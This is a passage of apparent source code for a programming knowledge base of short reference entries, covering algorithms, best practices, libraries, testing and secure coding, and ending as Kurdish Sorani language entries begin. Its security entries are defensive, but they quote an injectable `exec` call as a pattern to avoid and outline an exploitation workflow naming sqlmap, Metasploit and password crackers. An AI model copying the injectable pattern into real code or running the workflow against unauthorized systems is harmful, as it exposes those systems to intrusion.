    'DFS (Depth-First Search): Explore as deep as possible before backtracking. Time: O(V+E). Use for: cycle detection, topological sort, path finding, connected components, maze solving. Implementation: recursive or explicit stack. Variants: pre-order, in-order, post-order. Topological sort: DFS + reverse post-order for DAGs.', 1.2)

  add('algorithms', ['dijkstra', 'shortest path', 'weighted graph', 'priority queue'],
    'Dijkstra\'s Algorithm: Shortest path in weighted graph (non-negative edges). Time: O((V+E)log V) with min-heap. Implementation: priority queue, distance array (init infinity), relax edges. Process: extract min, update neighbors if shorter path found. For negative edges: use Bellman-Ford. For all-pairs: Floyd-Warshall.', 1.2)

  add('algorithms', ['hash table', 'hashmap', 'hashtable', 'hash function', 'collision'],
    'Hash Table: O(1) average lookup/insert/delete. Hash function maps keys to indices. Collision handling: chaining (linked lists at each bucket), open addressing (linear/quadratic probing, double hashing). Load factor: resize when > 0.75. In practice: Map/Object (JS), dict (Python), HashMap (Java), unordered_map (C++).', 1.3)

  add('algorithms', ['linked list', 'node', 'pointer', 'singly linked', 'doubly linked'],
    'Linked List: Sequence of nodes with pointers. Singly linked (next only), Doubly linked (prev + next). Operations: insert O(1) at head, delete O(1) if you have the node, search O(n). Patterns: two pointers (fast/slow for cycle detection, middle finding), dummy head (simplifies edge cases), reverse in-place.', 1.2)

  add('algorithms', ['tree', 'binary tree', 'bst', 'binary search tree', 'traversal'],
    'Binary Search Tree: Left < root < right. Operations: search/insert/delete O(log n) average, O(n) worst (unbalanced). Traversals: inorder (sorted), preorder (copy tree), postorder (delete tree), level-order (BFS). Self-balancing: AVL tree, Red-Black tree, B-tree. Common problems: validate BST, lowest common ancestor, serialize/deserialize.', 1.3)

  add('algorithms', ['heap', 'priority queue', 'heapify', 'min heap', 'max heap'],
    'Heap: Complete binary tree, parent ≥ children (max-heap) or ≤ (min-heap). Operations: insert O(log n), extract-min/max O(log n), peek O(1). Implemented as array: children at 2i+1, 2i+2, parent at floor((i-1)/2). Use for: priority queues, K largest/smallest, median finding (two heaps), Dijkstra\'s algorithm.', 1.2)

  add('algorithms', ['graph', 'adjacency list', 'adjacency matrix', 'directed', 'undirected'],
    'Graph representations: Adjacency list (Map<node, neighbors[]> — space efficient, good for sparse), Adjacency matrix (2D array — fast edge lookup, good for dense). Directed vs undirected, weighted vs unweighted, cyclic vs acyclic. Algorithms: BFS, DFS, Dijkstra, topological sort, minimum spanning tree (Prim/Kruskal).', 1.2)

  add('algorithms', ['trie', 'prefix tree', 'autocomplete', 'word search'],
    'Trie (Prefix Tree): Tree for string storage/search. Each node represents a character. Operations: insert O(m), search O(m), startsWith O(m) where m = word length. Use for: autocomplete, spell checking, IP routing, word games. Space optimization: compressed trie (radix tree). Implementation: Map<char, TrieNode> with isEnd flag.', 1.2)

  add('algorithms', ['lru cache', 'cache eviction', 'least recently used'],
    'LRU Cache: Evict least recently used item when capacity exceeded. Implementation: HashMap + Doubly Linked List. Operations: get O(1) — move to front, put O(1) — add to front, evict from back. In JavaScript: Map preserves insertion order (use delete+set to move to end). In Python: collections.OrderedDict.', 1.2)

  add('algorithms', ['two pointers', 'sliding window', 'fast slow pointer'],
    'Two Pointer techniques: 1) Opposite ends — converge inward (sorted array sum, palindrome), 2) Same direction — fast/slow (linked list cycle, remove duplicates), 3) Sliding window — expand/contract window (max sum subarray, longest substring without repeating). Time: usually O(n). Key: maintain invariant while moving pointers.', 1.3)

  // ── Best Practices Library ──
  add('practices', ['typescript best practice', 'strict mode', 'tsconfig'],
    'TypeScript best practices: Enable strict mode in tsconfig.json (strict: true). Use interfaces for object shapes, type aliases for unions/intersections. Prefer readonly for immutable data. Use discriminated unions for state machines. Avoid \'any\' — use \'unknown\' for truly unknown types. Use zod/io-ts for runtime validation matching compile-time types.', 1.3)

  add('practices', ['api design', 'rest best practice', 'api versioning'],
    'REST API best practices: 1) Use nouns for resources (/users, /posts), 2) HTTP methods for actions (GET read, POST create, PUT replace, PATCH update, DELETE remove), 3) Status codes (201 Created, 204 No Content, 400 Bad Request, 422 Unprocessable), 4) Version APIs (/v1/, /v2/), 5) Pagination (cursor-based), 6) HATEOAS for discoverability.', 1.2)

  add('practices', ['error response', 'api error', 'rfc 7807', 'problem details'],
    'API Error Responses (RFC 7807 Problem Details): { type: "uri", title: "string", status: number, detail: "string", instance: "uri" }. Standardize error format across APIs. Include: correlation ID for tracing, validation errors as array, machine-readable error codes. Never expose stack traces or internal details in production.', 1.2)

  add('practices', ['owasp', 'top 10', 'security checklist', 'web security'],
    'OWASP Top 10: 1) Broken Access Control, 2) Cryptographic Failures, 3) Injection (SQL, XSS, command), 4) Insecure Design, 5) Security Misconfiguration, 6) Vulnerable Components, 7) Authentication Failures, 8) Data Integrity Failures, 9) Logging/Monitoring Failures, 10) Server-Side Request Forgery (SSRF). Regular security audits, dependency scanning, penetration testing.', 1.3)

  add('practices', ['password security', 'bcrypt', 'argon2', 'hash password'],
    'Password security: Never store plaintext passwords. Use: bcrypt (most common, work factor 12+), argon2id (best, memory-hard), scrypt (alternative). Always add salt (built into bcrypt/argon2). Password requirements: minimum 8 chars, check against breach databases (HaveIBeenPwned API), no maximum length limit, allow all characters.', 1.3)

  add('practices', ['jwt best practice', 'token security', 'refresh token'],
    'JWT security: Short-lived access tokens (15 min), long-lived refresh tokens (7 days) stored in httpOnly cookies. Never store JWTs in localStorage (XSS risk). Use RS256 or ES256 (asymmetric) in production, HS256 only for simple cases. Validate: signature, expiration, issuer, audience. Rotation: refresh token rotation with reuse detection.', 1.3)

  add('practices', ['database optimization', 'query optimization', 'index strategy'],
    'Database optimization: 1) Add indexes on WHERE/JOIN/ORDER BY columns, 2) Use EXPLAIN ANALYZE to find slow queries, 3) Avoid SELECT * — list needed columns, 4) Use connection pooling, 5) Normalize for writes, denormalize for reads, 6) Partition large tables, 7) Use read replicas for scaling reads, 8) Cache hot data in Redis.', 1.2)

  add('practices', ['code review best practice', 'pull request', 'pr review'],
    'Code review best practices: 1) Keep PRs small (<400 lines), 2) Write descriptive PR titles and descriptions, 3) Review for: correctness, readability, security, performance, tests, 4) Be constructive — suggest alternatives, 5) Use "nit:" for minor suggestions, 6) Approve with minor comments, request changes for blocking issues. Automate: linting, formatting, type checking.', 1.2)

  add('practices', ['clean architecture', 'hexagonal', 'onion', 'domain driven'],
    'Clean Architecture: Dependencies point inward (domain → use cases → interfaces → infrastructure). Layers: Entity (business rules), Use Case (application logic), Interface Adapter (controllers, presenters), Infrastructure (DB, frameworks). Benefits: testable, framework-independent, technology-agnostic. Related: Hexagonal (ports + adapters), Onion Architecture.', 1.2)

  add('practices', ['functional programming', 'pure function', 'immutability', 'composition'],
    'Functional programming patterns: Pure functions (same input → same output, no side effects), Immutability (never mutate, return new data), Composition (pipe/compose small functions), Higher-order functions (map, filter, reduce), Currying/Partial application, Monads (Maybe/Option for null safety, Either/Result for error handling). Benefits: testable, predictable, parallelizable.', 1.2)

  // ── Common Libraries ──
  add('libraries', ['axios', 'fetch', 'http client', 'request library'],
    'HTTP clients: fetch (built-in, low-level, no auto-JSON, AbortController for cancellation), axios (interceptors, auto-JSON, request/response transforms, progress tracking, timeout, cancel tokens). ky: fetch wrapper with retries. got: Node.js only, streams. Best: fetch for simple, axios for complex with interceptors/retry logic.', 1.1)

  add('libraries', ['zod', 'joi', 'yup', 'validation library', 'schema validation'],
    'Validation libraries: Zod (TypeScript-first, infers types, composable, no dependencies), Joi (mature, extensive, enterprise), Yup (form validation, integrates with Formik). Zod example: const User = z.object({ name: z.string().min(1), age: z.number().positive() }). Use z.infer<typeof User> for TypeScript types. Validate: User.parse(data) or User.safeParse(data).', 1.2)

  add('libraries', ['lodash', 'ramda', 'utility library', 'helper functions'],
    'Utility libraries: Lodash (most popular — debounce, throttle, cloneDeep, groupBy, uniqBy), Ramda (functional, auto-curried, immutable). Modern alternatives: native JS (Array.flat, Object.entries, structuredClone), es-toolkit (lightweight modern Lodash). Import individual functions to reduce bundle: import debounce from \'lodash/debounce\'.', 1.0)

  add('libraries', ['winston', 'pino', 'bunyan', 'logging library'],
    'Logging libraries: Pino (fastest, JSON-only, low overhead — best for production), Winston (flexible, multiple transports, custom formats), Bunyan (JSON, child loggers). Best practices: structured logging (JSON), log levels (error > warn > info > debug), correlation IDs, don\'t log PII. Format: { timestamp, level, message, context, requestId }.', 1.1)

  add('libraries', ['socket.io', 'ws', 'websocket library'],
    'WebSocket libraries: ws (lightweight, Node.js only, raw WebSocket), Socket.io (fallback transport, rooms/namespaces, auto-reconnect, broadcasting). Socket.io: io.on("connection", socket => { socket.on("event", cb); socket.emit("event", data); }). Scaling: use Redis adapter for multi-server. Alternative: SSE for server→client only.', 1.1)

  // ── Additional Languages & Tools ──
  add('programming', ['scala', 'akka', 'functional jvm'],
    'Scala: JVM language combining OOP + FP. Key features: pattern matching, case classes, traits, implicit conversions, for-comprehensions, futures, type system. Tools: sbt (build), Akka (actor model), Play (web framework). Best practices: prefer val over var, use Option instead of null, leverage pattern matching for control flow.', 0.9)

  add('programming', ['elixir', 'phoenix', 'erlang', 'beam'],
    'Elixir: Functional language on the BEAM VM (Erlang). Key features: pattern matching, pipes (|>), processes (lightweight concurrency), supervisors (fault tolerance), OTP. Framework: Phoenix (real-time web). Best practices: use pattern matching for control flow, leverage GenServer for stateful processes, Phoenix LiveView for interactive UIs.', 0.9)

  add('programming', ['dart', 'flutter', 'mobile cross platform'],
    'Dart/Flutter: Cross-platform mobile/web/desktop framework. Dart features: null safety, async/await, mixins, extensions, named parameters. Flutter: widget tree, StatelessWidget/StatefulWidget, Provider/Riverpod for state, hot reload. Best practices: prefer const constructors, use key for lists, separate UI and logic.', 1.0)

  add('programming', ['zig', 'systems language', 'manual memory'],
    'Zig: Low-level systems language. No hidden control flow, no hidden allocations, no garbage collector. Key features: comptime (compile-time execution), optional types, error unions, C interop. Competes with C/Rust for systems programming. Best for: performance-critical code, replacing C, embedded systems.', 0.8)

  add('programming', ['wasm', 'webassembly', 'wasi', 'browser performance'],
    'WebAssembly (Wasm): Binary instruction format for browser/server. Near-native speed. Compile from: C/C++, Rust, Go, AssemblyScript. Use cases: compute-heavy tasks (image processing, games, crypto), running existing C/Rust code in browser. Tools: wasm-pack (Rust), Emscripten (C/C++). WASI: WebAssembly System Interface for server-side.', 1.0)

  // ── Design Patterns (expanded) ──
  add('patterns', ['repository pattern', 'data access', 'persistence layer'],
    'Repository Pattern: Abstracts data storage behind an interface. Interface defines methods (findById, save, delete), implementation handles specific storage (PostgreSQL, MongoDB, memory). Benefits: swap databases without changing business logic, easy to mock in tests, centralizes query logic. Use with: dependency injection, unit of work pattern.', 1.2)

  add('patterns', ['dependency injection', 'ioc', 'inversion of control'],
    'Dependency Injection: Pass dependencies to a class instead of creating them internally. Types: constructor injection (preferred), property injection, method injection. Benefits: testable (inject mocks), flexible (swap implementations), follows Open/Closed principle. Containers: InversifyJS (TS), Spring (Java), .NET DI. Use interfaces for abstractions.', 1.2)

  add('patterns', ['event sourcing', 'cqrs', 'event driven architecture'],
    'Event Sourcing: Store state as sequence of events, not current state. Replay events to reconstruct state. CQRS: separate read/write models — write side handles commands/events, read side optimized for queries. Benefits: complete audit trail, temporal queries, event replay. Challenges: eventual consistency, event schema evolution, projection management.', 1.1)

  add('patterns', ['circuit breaker', 'retry', 'resilience pattern', 'bulkhead'],
    'Resilience patterns: Circuit Breaker (stop calling failing service — closed→open→half-open), Retry with exponential backoff (2^n * base + jitter), Bulkhead (isolate failures), Timeout (fail fast), Fallback (graceful degradation). Libraries: resilience4j (Java), polly (.NET), cockatiel (TS). Essential for microservices.', 1.2)

  add('patterns', ['pub sub', 'message queue', 'event bus', 'message broker'],
    'Message patterns: Pub/Sub (publish to topic, many subscribers receive), Message Queue (point-to-point, one consumer processes), Event Bus (in-process pub/sub). Tools: RabbitMQ (AMQP, routing), Kafka (distributed log, high throughput), Redis Pub/Sub (simple, no persistence), SQS (AWS managed). Choose based on: ordering needs, delivery guarantees, throughput.', 1.2)

  // ── Testing (expanded) ──
  add('testing', ['jest', 'vitest', 'mocha', 'testing framework'],
    'JS Testing frameworks: Jest (batteries-included, snapshots, coverage, mocking), Vitest (Vite-native, fast, Jest-compatible API, ESM-first), Mocha (flexible, BYO assertion/mocking). Vitest is recommended for Vite projects. Key APIs: describe/it/expect, beforeEach/afterEach, vi.mock/vi.fn (Vitest), jest.mock/jest.fn (Jest).', 1.2)

  add('testing', ['mock', 'stub', 'spy', 'test double', 'fake'],
    'Test doubles: Mock (verifies interactions — was function called with these args?), Stub (returns predetermined responses), Spy (wraps real function, records calls), Fake (simplified implementation — in-memory database). Use mocks sparingly — prefer testing behavior over implementation. Mock external dependencies (APIs, databases, file system).', 1.2)

  add('testing', ['playwright', 'cypress', 'e2e testing', 'end to end'],
    'E2E testing: Playwright (multi-browser, auto-wait, API testing, codegen), Cypress (developer-friendly, time-travel debugging, component testing). Playwright: page.goto(), page.click(), page.fill(), expect(locator).toBeVisible(). Best practices: use page objects, test user flows not implementation, keep E2E tests few and meaningful.', 1.2)

  add('testing', ['property based testing', 'fuzzing', 'generative testing'],
    'Property-based testing: Generate random inputs, verify properties hold. fast-check (JS): fc.assert(fc.property(fc.string(), s => reverse(reverse(s)) === s)). Hypothesis (Python). Benefits: finds edge cases humans miss, tests invariants. Properties: roundtrip (encode→decode), idempotency, commutativity, invariants (sorted output is sorted).', 1.1)

  // ── Performance & Optimization ──
  add('performance', ['web vitals', 'lcp', 'fid', 'cls', 'core web vitals'],
    'Core Web Vitals: LCP (Largest Contentful Paint < 2.5s — optimize images, preload fonts, SSR), INP (Interaction to Next Paint < 200ms — break long tasks, use web workers), CLS (Cumulative Layout Shift < 0.1 — set image dimensions, avoid injected content, use transform for animations). Measure with: Lighthouse, PageSpeed Insights, web-vitals library.', 1.2)

  add('performance', ['lazy loading', 'code splitting', 'tree shaking', 'bundle size'],
    'Bundle optimization: Code splitting (dynamic import() — load on demand), Tree shaking (remove unused exports — use ESM), Lazy loading (React.lazy + Suspense), Image optimization (next/image, sharp, WebP/AVIF). Analyze: webpack-bundle-analyzer, vite-plugin-inspect. Targets: <200KB initial JS, <100ms TTI. Compression: gzip/brotli.', 1.2)

  add('performance', ['caching strategy', 'cache control', 'etag', 'stale while revalidate'],
    'HTTP Caching: Cache-Control headers (max-age, s-maxage, stale-while-revalidate, no-cache, no-store, immutable), ETag (conditional requests), Last-Modified. Strategy: immutable assets with hash in filename (cache forever), API responses with stale-while-revalidate, HTML with no-cache. CDN: cache at edge, purge on deploy.', 1.2)

  add('performance', ['database pool', 'connection pooling', 'pgbouncer', 'pool size'],
    'Connection pooling: Reuse database connections instead of creating new ones per request. Tools: pg-pool (Node.js), HikariCP (Java), pgBouncer (PostgreSQL proxy). Config: pool size = CPU cores * 2 + disk spindles (typically 10-20). Monitor: active/idle/waiting connections. Serverless: use RDS Proxy, PlanetScale, or Neon serverless drivers.', 1.1)

  // ── Modern Web ──
  add('web', ['typescript 5', 'decorators', 'const type', 'satisfies'],
    'TypeScript 5 features: Decorators (stage 3, no experimentalDecorators), const type parameters, satisfies operator (validate type without widening), verbatimModuleSyntax (explicit type imports), moduleResolution: bundler (for modern bundlers). Use: const T extends readonly string[] for literal inference, satisfies for config objects.', 1.1)

  add('web', ['bun', 'deno', 'runtime', 'alternative nodejs'],
    'JS runtimes: Node.js (established, huge ecosystem, CommonJS + ESM), Bun (fast, built-in bundler/test runner/package manager, Node.js compatible), Deno (secure by default, built-in TypeScript, web standard APIs, npm compatibility). Bun for: speed-critical, all-in-one tooling. Deno for: security, modern standards. Node for: ecosystem, stability.', 1.1)

  add('web', ['htmx', 'server driven', 'hypermedia', 'progressive enhancement'],
    'HTMX: Add AJAX behavior with HTML attributes. hx-get/post (HTTP requests), hx-trigger (events), hx-target (update element), hx-swap (how to insert). No JavaScript needed for most interactions. Server returns HTML fragments. Benefits: simplicity, progressive enhancement, less JS. Good for: CRUD apps, admin panels, server-rendered sites.', 1.0)

  add('web', ['astro', 'islands', 'static site', 'content driven'],
    'Astro: Content-driven web framework. Islands architecture: static HTML + interactive components only where needed. Zero JS by default. Supports: React, Vue, Svelte, Solid components. Features: content collections, MDX, SSG/SSR, view transitions. Best for: blogs, docs, marketing sites, content-heavy sites. Ships minimal JavaScript.', 1.0)

  // ── Cybersecurity Coding — Secure coding patterns and vulnerability prevention ──
  add('practices', ['secure coding', 'defensive coding', 'secure development', 'sdlc security'],
    'Secure Development Lifecycle: 1) Threat modeling (STRIDE, DREAD) during design, 2) Static analysis (SAST) in CI — Semgrep, SonarQube, CodeQL, 3) Dependency scanning (SCA) — npm audit, Snyk, Dependabot, 4) Dynamic testing (DAST) — OWASP ZAP, Burp Suite, 5) Secret scanning — git-secrets, truffleHog, 6) Container scanning — Trivy, Grype. Shift-left: catch vulnerabilities early, automate in CI/CD pipeline.', 1.4)

  add('practices', ['input sanitization', 'output encoding', 'xss prevention', 'html sanitization'],
    'XSS prevention patterns: 1) Output encoding — escape HTML entities (&lt; &gt; &amp; &quot;) for HTML context, URL-encode for URL context, JS-encode for JavaScript context. 2) Content Security Policy (CSP) headers — restrict script sources. 3) Use DOMPurify for HTML sanitization. 4) React/Angular auto-escape by default — avoid dangerouslySetInnerHTML/bypassSecurityTrust. 5) HttpOnly cookies prevent JS access. 6) X-XSS-Protection header (legacy). Code: `const safe = DOMPurify.sanitize(userInput); element.textContent = userInput;`', 1.4)

  add('practices', ['sql injection prevention', 'parameterized query', 'prepared statement', 'orm security'],
    'SQL injection prevention: ALWAYS use parameterized queries. Node.js: `db.query("SELECT * FROM users WHERE id = $1", [userId])`. Python: `cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))`. Java: `PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); ps.setInt(1, userId)`. ORMs (Prisma, Sequelize, SQLAlchemy) are safe by default but beware raw query methods. Never concatenate user input into SQL strings.', 1.5)

  add('practices', ['csrf protection', 'cross site request forgery', 'csrf token', 'same site cookie'],
    'CSRF protection: 1) SameSite cookie attribute (Strict or Lax) — blocks cross-origin requests, 2) CSRF tokens — unique per session, included in forms and validated server-side, 3) Double-submit cookie pattern — send token in both cookie and header, 4) Check Origin/Referer headers. Express: use csurf middleware. Django: built-in {% csrf_token %}. SPA pattern: read XSRF-TOKEN cookie, send in X-XSRF-TOKEN header.', 1.3)

  add('practices', ['command injection', 'os command', 'shell injection', 'subprocess security'],
    'Command injection prevention: NEVER use shell=True or string concatenation for OS commands. Node.js: use `execFile()` (not exec), pass args as array: `execFile("git", ["log", "--oneline", userBranch])`. Python: `subprocess.run(["git", "log", "--oneline", branch], shell=False)`. Avoid: `exec("git log " + userInput)`. Always validate/whitelist inputs, use libraries instead of shell commands when possible (e.g., archiver instead of tar).', 1.4)

  add('practices', ['path traversal', 'directory traversal', 'file inclusion', 'safe file path'],
    'Path traversal prevention: Never directly use user input in file paths. Patterns: 1) Validate — reject paths containing "..", "~", or absolute paths. 2) Normalize — `path.resolve(baseDir, userInput)` then verify it starts with baseDir. 3) Whitelist — map user IDs to allowed files. Node.js: `const safe = path.join(BASE, path.basename(input)); if (!safe.startsWith(BASE)) throw new Error("Traversal attempt")`. Chroot/sandboxing for defense-in-depth.', 1.4)

  add('practices', ['rate limiting', 'brute force prevention', 'ddos protection', 'api throttle'],
    'Rate limiting patterns: 1) Token bucket — fixed rate with burst allowance (express-rate-limit), 2) Sliding window — count requests in rolling time window, 3) Leaky bucket — constant drain rate. Implementation: Redis-based for distributed systems (rate-limiter-flexible). Headers: X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset. Auth endpoints: stricter limits + account lockout after N failures. Use Cloudflare/AWS WAF for DDoS at network level.', 1.3)

  add('practices', ['cors security', 'cross origin', 'cors configuration', 'origin whitelist'],
    'CORS security: Never use `Access-Control-Allow-Origin: *` with credentials. Whitelist specific origins: `const allowed = ["https://app.example.com"]; if (allowed.includes(origin)) res.setHeader("Access-Control-Allow-Origin", origin)`. Set `Access-Control-Allow-Credentials: true` only when needed. Restrict allowed methods and headers. Pre-flight caching: `Access-Control-Max-Age: 86400`. In Express: `cors({ origin: allowedOrigins, credentials: true })`.', 1.3)

  add('concepts', ['cryptography', 'encryption', 'hashing', 'digital signature', 'crypto coding'],
    'Cryptography in code: Hashing (one-way): SHA-256 for data integrity, bcrypt/argon2 for passwords. Symmetric encryption: AES-256-GCM (authenticated encryption). Asymmetric: RSA-OAEP (key exchange), Ed25519 (signatures). Node.js: `crypto.createCipheriv("aes-256-gcm", key, iv)`. Never: roll your own crypto, use ECB mode, use MD5/SHA1 for security. Always: use authenticated encryption (GCM/ChaCha20-Poly1305), secure random IVs (`crypto.randomBytes(16)`), constant-time comparison for secrets.', 1.4)

  add('concepts', ['pentest', 'penetration testing', 'security assessment', 'vulnerability scanning'],
    'Penetration testing workflow: 1) Reconnaissance — nmap port scan, subdomain enumeration (subfinder, amass), tech stack fingerprinting (Wappalyzer). 2) Vulnerability scanning — Nessus, OpenVAS, nuclei templates. 3) Exploitation — SQL injection (sqlmap), XSS (dalfox), SSRF, auth bypass. 4) Post-exploitation — privilege escalation, lateral movement. 5) Reporting — findings, impact, remediation. Tools: Burp Suite (web proxy), Metasploit (exploitation framework), John/Hashcat (password cracking). Always have written authorization.', 1.3)

  add('concepts', ['ctf', 'capture the flag', 'security challenge', 'ctf writeup'],
    'CTF categories: 1) Web — SQL injection, XSS, SSRF, deserialization, JWT manipulation, 2) Crypto — RSA attacks, block cipher modes, hash collisions, 3) Reverse engineering — binary analysis (Ghidra, IDA), debugging (GDB), anti-debugging, 4) Pwn — buffer overflow, ROP chains, format strings, heap exploitation, 5) Forensics — file carving, steganography, memory dumps, PCAP analysis, 6) Misc — OSINT, scripting challenges. Platforms: HackTheBox, TryHackMe, PicoCTF, OverTheWire. Use pwntools for exploit scripting.', 1.2)

  add('concepts', ['secure api', 'api security', 'api key management', 'api authentication'],
    'API security checklist: 1) Authentication — OAuth 2.0/OIDC for user APIs, API keys for service-to-service, mutual TLS for internal. 2) Authorization — RBAC/ABAC, validate on every request, principle of least privilege. 3) Input validation — schema validation (Zod/Joi), request size limits, content-type validation. 4) Rate limiting per client/endpoint. 5) Logging — log all auth events, anomalies, errors (no PII in logs). 6) Transport — TLS 1.3, HSTS, certificate pinning for mobile. 7) API versioning + deprecation policy.', 1.3)

  add('concepts', ['supply chain security', 'dependency security', 'lockfile', 'sbom'],
    'Supply chain security: 1) Lock files — always commit package-lock.json/yarn.lock, 2) Audit — `npm audit`, Snyk, Socket.dev for dependency analysis, 3) Pin versions — exact versions or tight ranges, 4) SBOM — Software Bill of Materials (CycloneDX, SPDX format), 5) Verify — check package provenance, npm package signing, 6) Minimal dependencies — prefer standard library, audit transitive deps, 7) Private registry — Verdaccio, GitHub Packages for internal packages. Use Renovate/Dependabot for automated updates with test gating.', 1.3)

  add('concepts', ['zero trust', 'network security', 'mTLS', 'service mesh security'],
    'Zero Trust architecture: Never trust, always verify. Principles: 1) Verify explicitly — authenticate and authorize every request, 2) Least privilege access — JIT/JEA, RBAC with minimal permissions, 3) Assume breach — segment network, encrypt all traffic. Implementation: mTLS between services (Istio/Linkerd service mesh), identity-aware proxy (BeyondCorp model), microsegmentation, continuous validation. Code impact: every service validates tokens, no implicit trust of internal networks.', 1.2)

  add('practices', ['secrets management', 'env vars', 'vault', 'secret rotation'],
    'Secrets management: Never hardcode secrets. Hierarchy: 1) HashiCorp Vault / AWS Secrets Manager / Azure Key Vault (best), 2) CI/CD secrets (GitHub Secrets, GitLab CI vars), 3) .env files (dev only, never commit). Patterns: secret rotation (auto-rotate every 90 days), envelope encryption, secret referencing vs embedding. Code: `const secret = await vault.read("secret/data/api-key")`. Detection: use pre-commit hooks (detect-secrets, git-secrets), .gitignore .env files, scan git history with truffleHog.', 1.4)

  add('practices', ['container security', 'docker security', 'kubernetes security', 'k8s security'],
    'Container security: 1) Minimal base images (distroless, Alpine), 2) Non-root USER in Dockerfile, 3) Read-only filesystem (`--read-only`), 4) No privileged mode, drop capabilities, 5) Scan images (Trivy, Grype), 6) Sign images (Cosign/Notary). K8s: PodSecurityStandards (restricted), NetworkPolicies, RBAC, OPA/Kyverno policies, encrypted secrets (sealed-secrets/external-secrets), resource limits. Runtime: Falco for anomaly detection, seccomp/AppArmor profiles.', 1.3)

  // ── Semantic Code Analysis — Understanding code meaning, structure, and quality ──
  add('concepts', ['semantic analysis', 'code understanding', 'ast', 'abstract syntax tree'],
    'Semantic code analysis: Goes beyond syntax to understand code meaning. AST (Abstract Syntax Tree): parse code into tree structure for analysis — TypeScript compiler API, Babel parser, tree-sitter. Use cases: 1) Dead code detection — find unreachable/unused code, 2) Complexity analysis — cyclomatic complexity, cognitive complexity, 3) Data flow analysis — track variable assignments and usage, 4) Type inference — deduce types from usage patterns, 5) Pattern matching — find code that matches semantic templates. Tools: SonarQube, ESLint custom rules, CodeQL semantic queries.', 1.3)

  add('concepts', ['code smell', 'refactoring indicator', 'technical debt', 'code quality metric'],
    'Code smells and semantic indicators: 1) Long method (>20 lines) — extract method, 2) God class (>300 lines, many responsibilities) — single responsibility principle, 3) Feature envy — method uses another class more than its own, 4) Shotgun surgery — one change requires many small edits, 5) Primitive obsession — use value objects, 6) Data clumps — group into class/interface, 7) Divergent change — class changes for multiple reasons. Metrics: cyclomatic complexity (<10), cognitive complexity (<15), coupling (afferent/efferent), lack of cohesion (LCOM).', 1.3)

  add('concepts', ['control flow analysis', 'data flow', 'taint analysis', 'code tracing'],
    'Control and data flow analysis: Control flow graph (CFG) maps all possible execution paths. Data flow analysis tracks variable definitions and uses. Taint analysis: mark untrusted inputs as "tainted", track propagation through code, flag when tainted data reaches sensitive sinks (SQL queries, file paths, eval). Forward analysis: where does this data go? Backward analysis: where did this value come from? Used in: SAST tools (CodeQL, Semgrep), IDE refactoring, dead code elimination, security vulnerability detection.', 1.3)

  add('concepts', ['dependency graph', 'module coupling', 'code architecture analysis', 'import analysis'],
    'Dependency and architecture analysis: Build module dependency graphs to understand structure. Metrics: 1) Afferent coupling (Ca) — incoming dependencies (how many modules depend on this), 2) Efferent coupling (Ce) — outgoing dependencies (how many modules this depends on), 3) Instability = Ce/(Ca+Ce), 4) Abstractness = abstract classes / total classes. Stable Dependency Principle: depend in direction of stability. Tools: dependency-cruiser (JS/TS), madge (circular deps), NDepend (.NET), ArchUnit (Java). Detect: circular dependencies, layer violations, unstable dependencies.', 1.2)

  add('concepts', ['code similarity', 'clone detection', 'duplicate code', 'semantic clone'],
    'Code clone detection: Type-1 (exact copy), Type-2 (renamed variables), Type-3 (modified statements), Type-4 (semantic clones — different code, same behavior). Detection: token-based (PMD CPD), AST-based (JSCPD), semantic (code2vec, CodeBERT embeddings). TF-IDF + cosine similarity for finding related code. Refactoring: extract shared function/class, template method pattern, strategy pattern for behavioral variants. Threshold: >6 lines duplicated or >3 instances → refactor.', 1.2)

  add('concepts', ['code generation pattern', 'template coding', 'scaffold', 'boilerplate generation'],
    'Semantic code generation patterns: 1) Template-based — fill placeholders in code templates (Handlebars, EJS), 2) AST manipulation — parse, transform, and regenerate code (jscodeshift, ts-morph), 3) Schema-driven — generate code from OpenAPI/GraphQL/Prisma schemas, 4) Pattern-based — match intent to code patterns (CRUD → repository + service + controller). Best practices: type-safe generation, format output (prettier), validate generated code compiles, generate tests alongside code. Tools: Plop.js, Hygen, GraphQL Code Generator, Prisma Client.', 1.2)

  // ── Kurdish Sorani Language — Alphabet & Writing System ───────────────────

  add('language', ['kurdish sorani', 'sorani', 'kurdish language', 'sorani kurdish', 'kurdish', 'کوردی', 'سۆرانی'],
    'Kurdish Sorani (کوردیی سۆرانی) is the Central Kurdish dialect, one of the two main dialects of the Kurdish language (the other being Kurmanji/Northern Kurdish). Sorani is spoken by approximately 6-7 million people, primarily in the Kurdistan Region of Iraq (Erbil/هەولێر, Sulaymaniyah/سلێمانی) and western Iran (Sanandaj/سنە). It uses a modified Arabic/Persian script with 33 letters. Sorani is an Indo-European language belonging to the Northwestern Iranian branch. It is the official language of the Kurdistan Region alongside Arabic.', 1.4)

  add('language', ['sorani alphabet', 'kurdish alphabet', 'kurdish letters', 'sorani letters', 'ئەلفبێی کوردی'],
    'The Sorani Kurdish alphabet (ئەلفبێ) has 33 letters based on modified Arabic script. Consonants: ب (b), پ (p), ت (t), ج (j), چ (ch), ح (ḥ), خ (kh), د (d), ر (r), ڕ (rr — trilled r, unique to Kurdish), ز (z), ژ (zh), س (s), ش (sh), ع (ʿ), غ (gh), ف (f), ڤ (v — unique Kurdish letter), ق (q), ک (k), گ (g), ل (l), ڵ (ll — velarized l, unique to Kurdish), م (m), ن (n), ه‍ (h), و (w), ی (y). Vowels written explicitly: ئا (â), ئە (a), ئێ (ê), ئی (î), ئۆ (o), ئوو (û). Kurdish is written right-to-left.', 1.4)

  add('language', ['sorani vowels', 'kurdish vowels', 'sorani diacritics', 'دەنگدار'],
    'Sorani Kurdish vowels (دەنگداران) — unlike Arabic, Sorani writes ALL vowels explicitly: ئا (â — long "a" as in "father"), ئە (a — short "a" as in "hat"), ئێ (ê — like "ay" in "say"), ئی (î — like "ee" in "see"), ئۆ (o — like "o" in "more"), ئوو (û — like "oo" in "moon"). This makes Kurdish more phonetically transparent than Arabic or Persian. At the start of words, vowels are preceded by ئ (hamza/glottal stop). Mid-word: ا (â), ە (a), ێ (ê), ی (î), ۆ (o), وو (û).', 1.3)

  // ── Kurdish Sorani — Grammar Fundamentals ─────────────────────────────────

  add('language', ['sorani grammar', 'kurdish grammar', 'sorani sentence structure', 'ڕێزمانی کوردی'],
